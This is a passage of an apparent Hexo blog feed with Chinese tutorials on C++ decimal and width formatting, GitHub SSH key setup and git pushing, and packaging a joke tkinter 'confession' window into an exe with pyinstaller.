operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903143043223.png#pic_center" alt="过了哟"></p><h3><span id="stl-set-de-api">STL-set的API</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903143726735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="set-API"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> sstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++中的小数位数控制和有效数字控制</title>
      <link href="/2020/09/03/xiaoshukongzhi/"/>
      <url>/2020/09/03/xiaoshukongzhi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="c-zhong-de-xiao-shu-wei-shu-kong-zhi-he-you-xiao-shu-zi-kong-zhi">C++中的小数位数控制和有效数字控制</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903162930156.GIF#pic_center" alt="下面都不会了"></p><h1><span id="shou-xian-lai-kan-kan-c-xiao-shu-wei-shu-kong-zhi">首先来看看C++小数位数控制</span></h1><h3><span id="ccf-201903-1-xiao-zhong-da">CCF-201903-1 小中大</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/202009031706411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903170650687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="dai-ma-zhong-ren-shi-ru-he-kong-zhi-xiao-shu-wei-shu-wai-jia-algorithm-han-shu-sort">代码中认识如何控制小数位数—外加algorithm函数sort()</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">1e5</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cin<span class="token operator">>></span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>num<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> mid<span class="token operator">=</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>num<span class="token punctuation">[</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2.0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> mid2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>mid<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">!=</span>mid2<span class="token punctuation">)</span><span class="token punctuation">{</span>          cout<span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>          cout<span class="token operator">&lt;&lt;</span>fixed<span class="token operator">&lt;&lt;</span><span class="token function">setprecision</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>mid<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//核心代码</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          cout<span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>mid2<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>我们采用cout&lt;&lt;fixed&lt;&lt;setprecision()就可以控制小数的输出位数了</strong></p><h1><span id="ru-he-kong-zhi-you-xiao-shu-chu-wei-shu-ni">如何控制有效输出位数呢？</span></h1><h3><span id="cong-dai-ma-ren-shi">从代码认识</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>n<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token function">setfill</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>n<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3><span id="jie-guo">结果</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903171616726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="过了哦"></p><h1><span id="zong-jie">总结</span></h1><p>如果要控制小数位数：<br><strong>cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;<br>这个是控制两位小数</strong><br>如果要控制有效数位：<br><strong>cout&lt;&lt;setw(2)&lt;&lt;n&lt;&lt;endl；<br>这个是控制有效数位为2<br>cout&lt;&lt;setw(2)&lt;&lt;setfill(‘0’)&lt;&lt;n&lt;&lt;endl<br> 这个如果位数不够则补零</strong></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++小数位数控制 </tag>
            
            <tag> c++有效数字控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公子世无双，代码永流传</title>
      <link href="/2020/07/11/repository/"/>
      <url>/2020/07/11/repository/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2><span id="wei-shi-me-yao-ba-dai-ma-huo-zhe-zi-yuan-shang-chuan-dao-github">为什么要把代码或者资源上传到github？</span></h2><h3><span id="1-fen-xiang-zi-ji-de-dai-ma-mian-shi-ke-yi-zhan-shi-zi-ji">1.分享自己的代码，面试可以展示自己</span></h3><h3><span id="2-ke-yi-zuo-chuang-tu-github-zi-dai-cdn-jia-su">2.可以做床图，github自带cdn加速</span></h3><pre class=" language-bash"><code class="language-bash">https://cdn.jsdelivr.net/gh/github用户名/github账号中的仓库名/资源名</code></pre><p>用这个方法访问资源可以加速，这个在博客后期优化中可以使用，床图就是把图资源全部放到一个仓库，然后从这个仓库中用cdn来调用这些资源</p><h3><span id="3-ke-yi-bu-shu-wo-men-de-bo-ke">3.可以部署我们的博客</span></h3><p>在这里就不得不说说github，码云gitee和Coding了，这三个都是可以部署的，我首先接触到的是github，github部署在国内访问就是很慢，后面换到码云gitee上，速度明显变快了。大概就是国内有点卡github吧！部署方式是差不多的，在gitee上添加一个ssh密钥，这个ssh和添加到github上面的一样，也就是说我们可以同时部署到github，gitee和Coding上面，我目前只部署过github和gitee，感觉gitee够用了，就没有在Coding上面部署了。</p><p>连接好ssh后，直接使用<strong>hexo s</strong>本地查看博客无误后，可以直接用<strong>hexo g -d</strong>来部署<br>ssh如何创建后面提到</p><h2><span id="zheng-chang-shang-chuan-de-liu-cheng">正常上传的流程</span></h2><h3><span id="yi-chuang-jian-yi-ge-cang-ku-bing-fu-zhi-cang-ku-https-di-zhi">一.创建一个仓库并复制仓库HTTPS地址</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200711224247243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="记得勾选init README"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200711224339978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="绿色得Code下面复制HTTPS地址"></p><h3><span id="er-sheng-cheng-ssh-mi-yao-lai-guan-lian-github-he-you-xiang">二.生成ssh密钥，来关联github和邮箱</span></h3><h4><span id="1-jian-cha-dian-nao-shi-fou-yi-jing-you-ssh-key">1.检查电脑是否已经有ssh key</span></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> ~/.ssh<span class="token function">ls</span></code></pre><p>如果<strong>id_rsa.pub</strong>或<strong>id_dsa.pub</strong>文件，可以跳过步骤2，直接进入步骤3.</p><h4><span id="2-shou-xian-shi-yong-git-config-ming-ling-she-zhi-yong-hu-ming-he-di-zhi-bing-chan-sheng-rsa-key">2.首先，使用git config命令设置用户名和地址并产生rsa key</span></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"设置的用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"设置的邮件地址"</span>ssh-keygen -t rsa -C <span class="token string">"设置的邮件地址"</span></code></pre><p>接着又会提示你输入两次密码（该密码是你push文件的时候要输入的密码，而不是github管理者的密码），当然，你也可以不输入密码，直接按回车。那么push的时候就不需要输入密码，直接提交到github上了<br>然后在<strong>C盘user中.ssh文件中可以找到id_rsa.pub文件</strong>，复制里面的内容稍后使用</p><h3><span id="san-zai-github-zhong-tian-jia-ssh-mi-yao">三.在github中添加ssh密钥</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200711230117454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="点击setting"></p><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/202007112301294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="点击SSH and GPG keys"></p><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200711230137877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="点击New SSH key"></p><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200711230146770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="将复制的文件内容填入，title随意，然后Add"></p><h3><span id="si-ce-shi-ssh-key">四.测试SSH key</span></h3><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com</code></pre><p>当你输入以上代码时，会有一段警告代码，如：</p><pre class=" language-bash"><code class="language-bash">The authenticity of host <span class="token string">'github.com (207.97.227.239)'</span> can't be established.<span class="token comment" spellcheck="true"># RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span><span class="token comment" spellcheck="true"># Are you sure you want to continue connecting (yes/no)?</span></code></pre><p>这是正常的，你输入 yes 回车既可。如果你创建 SSH key 的时候设置了密码，接下来就会提示你输入密码，如：</p><pre class=" language-bash"><code class="language-bash">Enter passphrase <span class="token keyword">for</span> key <span class="token string">'/c/Users/Administrator/.ssh/id_rsa'</span><span class="token keyword">:</span></code></pre><p>当然如果你密码输错了，会再要求你输入，知道对了为止。<br>注意：输入密码时如果输错一个字就会不正确，使用删除键是无法更正的。<br>密码正确后你会看到下面这段话，如：</p><pre class=" language-bash"><code class="language-bash">Hi username<span class="token operator">!</span> You've successfully authenticated, but GitHub does not<span class="token comment" spellcheck="true"># provide shell access.</span></code></pre><p>如果用户名是正确的,你已经成功设置SSH密钥。如果你看到 “access denied” ，者表示拒绝访问，那么你就需要使用 https 去访问，而不是 SSH 。</p><h3><span id="wu-ben-di-cao-zuo">五.本地操作</span></h3><p>成功安装git后，右键项目，右键会出现两个新选项，分别是Git GUI Here和Git Bash Here，这里我们选择Git Bash Here，进入操作界面<br>输入以下代码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token string">"之前仓库复制的地址"</span></code></pre><p>这个步骤之后本地项目文件夹下面就会多出一个文件夹，这个文件夹的名字就是仓库的名字，然后把需要上传的文件全部复制到这个文件夹中<br>通过命令cd 进入该文件夹，然后输入以下代码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> add <span class="token keyword">.</span> <span class="token comment" spellcheck="true">#把文佳佳下面的文件都添加进来</span><span class="token function">git</span> commit -m <span class="token string">"提交信息"</span> <span class="token comment" spellcheck="true">#提交信息相当于注释，可以是"first commit"</span><span class="token function">git</span> push -u origin master <span class="token comment" spellcheck="true">#把本地仓库push到github上面，需要输入github账号和密码</span></code></pre><h2><span id="yu-dao-de-bug">遇到的bug</span></h2><p>我当时是push的时候报错了，不知道是什么原因，最后发现问题是不小心删除了本地仓库的README.md文件，就是本地仓库如果没有github仓库中的readme文件是没有办法push的，当时第一次上传完觉得这个文件没用就删掉了，后面第二次上传就一直报错。<br>我们可以通过以下指令进行<strong>添加readme.md文件到本地仓库。</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> pull --rebase origin master</code></pre><p><strong>然后调用push即可</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push origin master</code></pre><p><strong>最后就上传成功了！解决了BUG！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 帅得乱七八糟的bug </tag>
            
            <tag> ssh-key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表白程序怎么发过去呢？好苦恼！</title>
      <link href="/2020/07/09/pyexe/"/>
      <url>/2020/07/09/pyexe/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="python-ru-he-sheng-cheng-windows-ke-zhi-xing-de-exe-wen-jian">Python如何生成windows可执行的exe文件</span></h1><h2><span id="wei-shi-me-yao-sheng-cheng-ke-zhi-xing-wen-jian">为什么要生成可执行文件</span></h2><ul><li>不需要安装对应的编程环境</li><li>可以将你的应用闭源</li><li>用户可以方便，快捷的直接使用</li></ul><h2><span id="da-bao-gong-ju">打包工具</span></h2><p><strong>pyinstaller</strong></p><h3><span id="an-zhuang-pyinstaller">安装pyinstaller</span></h3><pre><code>pip install pyinstaller</code></pre><h3><span id="pyinstaller-can-shu-zuo-yong">pyinstaller参数作用</span></h3><ul><li>-F表示生成单个可执行文件</li><li>-D -onedir创建一个目录，包含exe文件，但会依赖很多文件（默认选项）</li><li>-w表示去掉控制台窗口，着在GUI界面时非常有用。不过如果是命令行程序的话那就不能使用这个参数</li><li>-c -console，-nowindowed使用控制台，无界面（默认）</li><li>-p 表示你自己自定义需要加载的类路径，一般情况用不到</li><li>-i 表示可执行文件的图标</li><li>其他参数，可以通过pyinstaller –help查看</li></ul><h2><span id="sheng-cheng-exe-shi-zhan">生成exe实战</span></h2><h3><span id="sheng-cheng-zhi-ling">生成指令</span></h3><p>首先我们通过cd 到达工程目录，然后使用代码</p><pre><code>pyinstaller -Fw --icon=xin.ico love.py</code></pre><p>–icon=xin.ico 是指定生成exe软件的图表，这个xin.ico图标放在工程文件的目录下<br>love.py是要生成exe文件的原python文件</p><h3><span id="sheng-cheng-xiao-guo">生成效果</span></h3><p>指令执行后会生成一个dist文件夹，里面有生成exe文件，然后需要把表白图标也放到这个文件夹下，然后点开exe文件就可以运行了。<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708222028444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="生成效果"></p><h3><span id="biao-bai-ruan-jian-xiao-guo">表白软件效果！</span></h3><h4><span id="dian-kai-xiao-guo">点开效果</span></h4><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708222918849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="点开效果"></p><h4><span id="dian-ji-x-de-xiao-guo">点击X的效果</span></h4><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708224723555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="关是关不掉的"></p><h4><span id="dian-ji-bu-xi-huan-de-xiao-guo">点击不喜欢的效果</span></h4><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708224841834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="不喜欢也是不行的"></p><h4><span id="dian-ji-xi-huan-de-xiao-guo">点击喜欢的效果</span></h4><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708224908511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="只能点喜欢才能关闭"></p><h3><span id="zong-jie">总结</span></h3><p>除了点喜欢是关闭不了窗口的，给人一种霸道总裁的感觉，真是太棒了！<br>如果妹子使用任务管理器和直接关机来解决，那就直接放弃吧！她不懂浪漫。。。</p><h3><span id="zui-hou-shi-biao-bai-ruan-jian-de-dai-ma">最后是表白软件的代码</span></h3><p>代码其实很简单就是python一个包的使用，还可以用pygame给软件加配乐，但是配乐后生成exe有点小bug还没有解决，如果有同学解决了的可以联系我，我们一起实现男女协调，人人成家呀！！！</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> messagebox<span class="token comment" spellcheck="true"># import pygame</span><span class="token comment" spellcheck="true">#直接点击x的方法</span><span class="token keyword">def</span> <span class="token function">closeWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">"先别走啊！"</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">"躲得过初一，躲不过十五！"</span><span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true">#点击喜欢后的方法</span><span class="token keyword">def</span> <span class="token function">Love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#顶级窗口</span>    love<span class="token operator">=</span>Toplevel<span class="token punctuation">(</span>window<span class="token punctuation">)</span>    love<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">"240x90+820+400"</span><span class="token punctuation">)</span>    love<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"好巧，我也是"</span><span class="token punctuation">)</span>    label<span class="token operator">=</span>Label<span class="token punctuation">(</span>love<span class="token punctuation">,</span>text <span class="token operator">=</span> <span class="token string">"真好"</span><span class="token punctuation">,</span>font <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"微软雅黑"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#pack 定位</span>    label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    btn <span class="token operator">=</span> Button <span class="token punctuation">(</span>love <span class="token punctuation">,</span> text <span class="token operator">=</span><span class="token string">"确定"</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>heigh <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>command<span class="token operator">=</span>closeallwindow<span class="token punctuation">)</span>    btn<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    love<span class="token punctuation">.</span>protocol<span class="token punctuation">(</span><span class="token string">"WM_DELETE_WINDOW"</span><span class="token punctuation">,</span> closelove<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#喜欢后的点击x的方法</span><span class="token keyword">def</span> <span class="token function">closelove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span><span class="token comment" spellcheck="true">#点击喜欢后确定的方法</span><span class="token keyword">def</span> <span class="token function">closeallwindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#destory 销毁</span>    window<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#点击不喜欢的方法</span><span class="token keyword">def</span> nolove <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    no_love <span class="token operator">=</span> Toplevel<span class="token punctuation">(</span>window<span class="token punctuation">)</span>    no_love <span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">"240x90+820+400"</span><span class="token punctuation">)</span>    no_love<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"再考虑考虑呗"</span><span class="token punctuation">)</span>    label <span class="token operator">=</span> Label<span class="token punctuation">(</span>no_love<span class="token punctuation">,</span>text <span class="token operator">=</span><span class="token string">"麻烦你再想想办法！"</span><span class="token punctuation">,</span>font <span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"微软雅黑"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    label<span class="token punctuation">.</span>pack <span class="token punctuation">(</span><span class="token punctuation">)</span>    btn <span class="token operator">=</span> Button<span class="token punctuation">(</span>no_love<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"确定"</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> heigh<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> command<span class="token operator">=</span>no_love<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>    btn<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    no_love<span class="token punctuation">.</span>protocol<span class="token punctuation">(</span><span class="token string">"WM_DELETE_WINDOW"</span><span class="token punctuation">,</span> closenolove<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#不喜欢再考虑点击x的方法</span><span class="token keyword">def</span> closenolove <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span><span class="token comment" spellcheck="true">#创建窗口</span>window <span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#窗口标题</span>window <span class="token punctuation">.</span>title <span class="token punctuation">(</span><span class="token string">"你喜欢我吗?"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#窗口的大小      中间用x连接</span>window<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">"580x710"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#窗口的位置  几何</span>window<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">"+560+150"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#protocol 用户关闭窗口触发的事件</span>window<span class="token punctuation">.</span>protocol <span class="token punctuation">(</span><span class="token string">"WM_DELETE_WINDOW"</span><span class="token punctuation">,</span>closeWindow<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#标签控件</span>label<span class="token operator">=</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"hey 41！"</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"微软雅黑"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#定位  网格布局</span>label<span class="token punctuation">.</span>grid <span class="token punctuation">(</span>sticky<span class="token operator">=</span>W <span class="token punctuation">)</span><span class="token comment" spellcheck="true">#标签控件</span>label1<span class="token operator">=</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"41，你喜欢我吗？"</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"微软雅黑"</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#定位  网格布局    sticky对齐方式 E W S  N</span>label1<span class="token punctuation">.</span>grid <span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>E<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#显示图片</span>photo<span class="token operator">=</span>PhotoImage<span class="token punctuation">(</span>file<span class="token 